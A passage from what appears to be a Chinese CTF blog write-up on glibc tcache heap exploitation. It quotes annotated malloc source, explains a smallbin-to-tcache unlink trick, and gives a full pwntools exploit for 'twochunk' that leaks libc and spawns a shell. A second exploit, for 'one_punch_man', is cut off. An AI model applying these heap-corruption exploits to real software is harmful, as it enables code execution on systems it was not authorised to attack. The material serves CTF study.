class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//从fastbin中取出后,若还有剩余,取出放入tcache中,直到放完或者tcache满停止</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">	    *fb = victim-&gt;fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    REMOVE_FB (fb, pp, victim);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">	      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line">	      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">			*fb = tc_victim-&gt;fd;</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      <span class="keyword">return</span> p;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//从smallbin中取出后,若有剩余chunk,则取出放入tcache,取完或者tcache放满为止,这里有unlink漏洞</span></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)               <span class="comment">//victim为最早放入smallbin的chunk</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;                           <span class="comment">//bck为倒数第二个放进smallbin的chunk</span></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))      <span class="comment">//构造(bck-&gt;fd == victim)绕过检测</span></span><br><span class="line">	    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;                             <span class="comment">//bin-&gt;bk = bck,伪造bck-&gt;bk = fake_chunk</span></span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count <span class="comment">//第一次:tc_victim = 倒数第二个放进smallbin的chunk</span></span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)           <span class="comment">//第二次:tc_victim = fake_chunk</span></span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;                    <span class="comment">//第一次:bck = fake_chunk</span></span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;                         <span class="comment">//第一次:bin-&gt;bk = fake_chunk</span></span><br><span class="line">		      bck-&gt;fd = bin;                         <span class="comment">//第一次:fake_chunk-&gt;fd被写入libc地址/第二次:fake_chunk-&gt;bk-&gt;fd被写入libc地址</span></span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);       <span class="comment">//第一次:将倒数第二个放进smallbin的chunk放入tcache/第二次:将fake_chunk放入tcache中,再次申请出来即可,fd处的libc地址会被覆盖掉(fake_chunk-&gt;bk-&gt;fd处的libc仍然残留)</span></span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在遍历unsortedbin时,找到size正好符合的chunk后,先放入tcache中,继续遍历完毕,遍历完毕后从tcache中取出返回给用户。</span></span><br></pre></td></tr></table></figure>
+<p>在<code>heap</code>的最开始处，会申请一个<code>0x290</code>的chunk来管理所有<code>tcache</code>，也就是<code>tcache_perthread_struct</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[<span class="number">64</span>];</span><br><span class="line">  tcache_entry *entries[<span class="number">64</span>];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0000000000000000 0000000000000291</span></span><br><span class="line"><span class="comment">xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx     ========</span></span><br><span class="line"><span class="comment">xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx        </span></span><br><span class="line"><span class="comment">xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx        </span></span><br><span class="line"><span class="comment">xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx     counts,共64个 * 2Bytes = 128/0x80Bytes</span></span><br><span class="line"><span class="comment">xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx        </span></span><br><span class="line"><span class="comment">xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx        </span></span><br><span class="line"><span class="comment">xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx</span></span><br><span class="line"><span class="comment">xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx     ========</span></span><br><span class="line"><span class="comment">################ ################     ========</span></span><br><span class="line"><span class="comment">........                              entries,共64个 * 8Bytes = 521/0x200Bytes</span></span><br><span class="line"><span class="comment">################ ################     ========</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<p>可以放入<code>tcache</code>中的<code>size(包含chunk_header)</code>范围：<code>0x20(tcache_entry[0])~0x410(tcache_entry[63])</code>的闭区间。</p>
+<h1 id="twochunk"><a href="#twochunk" class="headerlink" title="twochunk"></a>twochunk</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><code>calloc</code>有两个地方需要注意：</p>
+<ol>
+<li>不从<code>tcache</code>中取。</li>
+<li>取出后内容会清0，不会留下脏数据。</li>
+</ol>
+<p>题目限制：</p>
+<ol>
+<li>一次<code>malloc(0xE9)</code>的机会</li>
+<li>一次<code>malloc(0x88)</code>且可以向其中输入东西的机会</li>
+<li>两个放chunk的位置</li>
+<li>不限制次数，size限制在<code>0x80~0x3FF</code>之间的<code>calloc</code>的机会</li>
+<li>一次打印申请出来chunk前8字节的机会</li>
+<li>一次溢出的机会</li>
+<li>一次打印<code>name</code>和<code>message</code>的机会</li>
+<li>一个函数指针后门</li>
+</ol>
+<p>漏洞就是为堆溢出，所以猜测思路应该是篡改<code>next_chunk</code>的<code>fd &amp;&amp; bk</code>，然后在解链时进行攻击。</p>
+<p>利用点为：从<code>smallbin</code>中取出一个chunk后，会将剩余chunk解链进入<code>tcache</code>，这个过程的解链是没有自闭检测的，且不用担心因为<code>smallbin</code>被破坏而程序崩掉，因为当<code>tcache</code>满了会自动退出循环。</p>
+<p>构造出<code>0x90</code>的<code>tcache</code>中有5个chunk，<code>smallbin</code>中有两个chunk的情形，之后通过溢出改后放入<code>smallbin</code>的chunk的<code>fd &amp;&amp; bk</code>，<code>fd</code>不能动，<code>bk</code>改为指向<code>fake_chunk</code>，<code>fake_chunk</code>的<code>bk</code>需要指向可写的地址，循环结束后的情形为：</p>
+<ul>
+<li><code>0x90</code>的<code>tcache</code>已满，且头部的chunk为<code>fake_chunk</code></li>
+<li>在<code>fake_chunk-&gt;bk</code>处留下了<code>libc</code>的脏数据</li>
+</ul>
+<p>泄露+任意地址写即可。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = <span class="string">'./twochunk'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">attach = <span class="number">1</span></span><br><span class="line"><span class="comment">#P = ELF(path)</span></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>])</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">	p = process(path)</span><br><span class="line">	<span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'idx: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'size: '</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'idx: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span>              <span class="comment">#read(0,ptrlist[idx],size+0x20)</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'idx: '</span>)</span><br><span class="line">	p.sendline(str(idx))	</span><br><span class="line">	p.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span>                   <span class="comment">#write(1,ptrlist[idx],8)</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'idx: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor1</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'5'</span>)	  <span class="comment">#puts(name) puts(message)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor2</span><span class="params">(data)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'6'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'leave your end message: '</span>)  <span class="comment">#read(0,malloc(0x88),0x80)</span></span><br><span class="line">	p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor3</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'leave your name: '</span>)</span><br><span class="line">name = p64(<span class="number">0x23333000</span>+<span class="number">0x20</span>)*<span class="number">6</span></span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">message = p64(<span class="number">0x23333000</span>+<span class="number">0x20</span>)*<span class="number">8</span></span><br><span class="line">p.send(message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#0x190 7</span></span><br><span class="line">    new(<span class="number">0</span>,<span class="number">0x180</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>): <span class="comment">#0x90 5</span></span><br><span class="line">    new(<span class="number">0</span>,<span class="number">0x88</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>): <span class="comment">#0x100 5</span></span><br><span class="line">    new(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x180</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x90</span>) <span class="comment">#0xA0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x180</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)    <span class="comment">#put in unsortedbin size = 0x190</span></span><br><span class="line">new(<span class="number">0</span>,<span class="number">0xf0</span>)  <span class="comment">#unsortedbin size = 0x90</span></span><br><span class="line">delete(<span class="number">0</span>)    <span class="comment">#put in tcache size = 0x100(now count = 6)</span></span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x100</span>) <span class="comment">#put 0x90 unsortedbin in smallbin</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x100</span>) <span class="comment">#put 0x90 unsortedbin in smallbin</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">0</span>,<span class="number">23333</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heapbase = u64(p.recv(<span class="number">8</span>))-(<span class="number">0x5646cee63560</span><span class="number">-0x5646cee62000</span>)</span><br><span class="line">log.success(<span class="string">'heapbase = '</span>+hex(heapbase))</span><br><span class="line"><span class="comment">#-------------------------------------------------------------</span></span><br><span class="line">target = heapbase + (<span class="number">0x000055555555a650</span><span class="number">-0x555555559000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0xf0</span></span><br><span class="line">payload+= p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)</span><br><span class="line">payload+= p64(target)+p64(<span class="number">0x23333000</span><span class="number">-0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">backdoor1()</span><br><span class="line">p.recvuntil(<span class="string">'message: '</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-(<span class="number">0x7ffff7fbec60</span><span class="number">-0x7ffff7dd4000</span>)</span><br><span class="line">log.success(<span class="string">'libcbase = '</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">payload = p64(libcbase+libc.sym[<span class="string">'system'</span>])+<span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload+= p64(<span class="number">0x23333008</span>)</span><br><span class="line">backdoor2(payload)</span><br><span class="line"></span><br><span class="line">backdoor3()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="one-punch-man"><a href="#one-punch-man" class="headerlink" title="one_punch_man"></a>one_punch_man</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>有<code>UAF</code>的话可以直接伪造<code>next_chunk</code>与<code>fake_chunk</code>，需要注意的是<code>fake_chunk-&gt;bk</code>必须是个可写的地址，所以我这里找的是<code>__malloc_hook</code>附近的一个地址。最后改<code>__malloc_hook</code>为<code>gadget</code>，抬栈进行<code>rop</code>。</p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = <span class="string">'./one_punch_man'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">attach = <span class="number">1</span></span><br><span class="line"><span class="comment">#P = ELF(path)</span></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>])</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">	p = process(path)</span><br><span class="line">	<span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'idx: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'idx: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'idx: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'idx: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">	new(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x218</span>)</span><br><span class="line">	delete(<span 